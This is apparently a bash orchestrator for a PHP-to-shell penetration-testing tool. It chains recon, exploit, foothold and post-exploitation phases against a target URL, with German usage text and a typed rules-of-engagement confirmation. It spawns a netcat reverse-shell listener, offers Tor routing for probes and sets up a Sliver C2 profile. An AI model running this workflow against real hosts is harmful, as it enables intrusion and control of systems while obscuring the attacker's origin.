#!/usr/bin/env bash
# Remote engagement orchestrator — incremental, chained phases against an
# RoE-authorized production host. Every phase is idempotent; resume continues
# where the last run stopped. Listeners/consoles spawn as separate terminals.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
export LAB_ROOT="$ROOT"
# shellcheck source=scripts/docker-env.sh
source "$ROOT/scripts/docker-env.sh"
source "$ROOT/remote/lib/scope.sh"
source "$ROOT/remote/lib/term.sh"
source "$ROOT/remote/lib/state.sh"
source "$ROOT/remote/phases/00-scope.sh"
source "$ROOT/remote/phases/10-recon.sh"
source "$ROOT/remote/phases/20-fingerprint.sh"
source "$ROOT/remote/phases/30-exploit.sh"
source "$ROOT/remote/phases/40-foothold.sh"
source "$ROOT/remote/phases/50-postex.sh"
source "$ROOT/remote/phases/60-report.sh"

usage() {
  cat <<'EOF'
engage — Remote-Engagement gegen autorisierte Produktivsysteme (RoE-Gate)

  vtbw-php2shell-lab engage run <target-url> [optionen]
  vtbw-php2shell-lab engage resume <session-id>
  vtbw-php2shell-lab engage listeners <session-id>   Listener-Fenster erneut spawnen
  vtbw-php2shell-lab engage status [session-id]

Pflicht (jedes Mal):
  scope-authorized.txt  — Ziel-Host muss eingetragen sein (RoE-Nachweis)
  CONFIRM_ROE=I-AM-AUTHORIZED

Optionen (Env):
  ENGAGE_SID=…            Session-Id (Default: UTC-Timestamp)
  ENGAGE_TOR=on           Recon/Probes über Tor (Exit 127.0.0.1:9050)
  ENGAGE_C2=sliver        Post-Ex-Profil (Default: none)
  ENGAGE_LHOST=…          Operator-IP für Rückkanal (Pflicht ab Phase 40)
  ENGAGE_LPORT=4444
  ENGAGE_TERMINAL=tmux|gnome|konsole|kitty|xterm|none

Phasen (inkrementell, resume-fähig, Artefakte in out/engage/<sid>/):
  00 scope → 10 recon → 20 fingerprint → 30 exploit
    → 40 foothold (Listener-Fenster) → 50 post-ex (C2/Console-Fenster) → 60 report
EOF
}

cmd_run() {
  local url="${1:?Ziel-URL fehlt (siehe: engage help)}"
  export TARGET_URL="$url"
  export ENGAGE_SID="${ENGAGE_SID:-$(date -u +%Y%m%d-%H%M%S)}"
  state_init "$ENGAGE_SID"
  echo "════════════════════════════════════════════════"
  echo " engage · Session $ENGAGE_SID · Ziel $TARGET_URL"
  echo "════════════════════════════════════════════════"
  phase_scope
  state_hydrate
  phase_recon
  state_hydrate
  phase_fingerprint
  state_hydrate
  phase_exploit
  state_hydrate
  phase_foothold
  state_hydrate
  phase_postex
  state_hydrate
  phase_report
  echo
  echo "Fertig. Report: $ENGAGE_DIR/REPORT.md"
}

cmd_resume() {
  local sid="${1:?Session-Id fehlt}"
  export ENGAGE_SID="$sid"
  state_init "$sid"
  [[ ! -f "$ENGAGE_STATE/00.env.TARGET_URL" ]] && { echo "Keine Session $sid (kein Scope-State)." >&2; exit 1; }
  export TARGET_URL; TARGET_URL="$(state_get 00 TARGET_URL)"
  echo "Resume $sid → $TARGET_URL"
  state_resume_report
  state_hydrate
  phase_recon; state_hydrate
  phase_fingerprint; state_hydrate
  phase_exploit; state_hydrate
  phase_foothold; state_hydrate
  phase_postex; state_hydrate
  phase_report
}

cmd_listeners() {
  local sid="${1:?Session-Id fehlt}"
  export ENGAGE_SID="$sid"; state_init "$sid"
  local lhost lport
  lhost="$(state_get 40 LISTEN_HOST)"; lport="$(state_get 40 LISTEN_PORT)"
  [[ -z "$lport" ]] && { echo "Keine Listener-Phase in $sid." >&2; exit 1; }
  term_spawn_jobs "p2s-$sid" "$ENGAGE_DIR/logs" \
    "listener|nc -lvnp $lport" \
    "logs|tail -f '$ENGAGE_DIR/logs/30-exploit.log'"
  echo "Listener erneut gestartet (Port $lport)."
}

cmd_status() {
  local base="$ROOT/out/engage"
  [[ ! -d "$base" ]] && { echo "Noch keine Engagements."; return 0; }
  local d
  for d in "$base"/*/; do
    local sid; sid="$(basename "$d")"
    [[ -n "${1:-}" && "$sid" != "$1" ]] && continue
    echo "── $sid"
    if [[ -f "$d/state/00.env.TARGET_URL" ]]; then
      echo "   Ziel: $(cat "$d/state/00.env.TARGET_URL")"
    fi
    ENGAGE_DIR="$d" ENGAGE_STATE="$d/state" state_resume_report
  done
}

case "${1:-help}" in
  run)       shift; cmd_run "$@" ;;
  resume)    shift; cmd_resume "$@" ;;
  listeners) shift; cmd_listeners "$@" ;;
  status)    shift; cmd_status "$@" ;;
  help|--help|-h|"") usage ;;
  *) usage; exit 1 ;;
esac
